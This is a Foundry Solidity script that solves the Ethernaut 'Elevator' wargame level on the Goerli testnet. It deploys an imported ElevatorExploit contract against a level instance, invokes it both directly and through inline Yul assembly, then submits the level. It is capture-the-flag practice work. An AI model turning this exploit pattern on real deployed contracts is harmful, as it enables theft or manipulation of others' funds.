// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { ElevatorExploit } from "../../contracts/11_Elevator.sol";

interface Instance {
    function goTo(uint _floor) external;

    function top() external view returns (bool);

    function floor() external view returns (uint);
}

contract ElevatorScript is EthernautScript {
    string network = "goerli";
    address level = 0x4A151908Da311601D967a6fB9f8cFa5A3E88a251;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        ElevatorExploit exploit = new ElevatorExploit();
        exploit.exploit(address(instance));
        require(instance.top() == true);
    }

    function yulVersion() internal {
        bytes memory elevatorExploitCode = type(ElevatorExploit).creationCode;
        assembly {
            let exploit := create(0, add(elevatorExploitCode, 0x20), mload(elevatorExploitCode))

            mstore(0, "exploit(address)")
            mstore(0, keccak256(0, 16))
            mstore(4, sload(instance.slot))
            let success := call(gas(), exploit, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "top()")
            mstore(0, keccak256(0, 5))
            pop(staticcall(gas(), sload(instance.slot), 0, 4, 0, 32))
            if iszero(mload(0)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
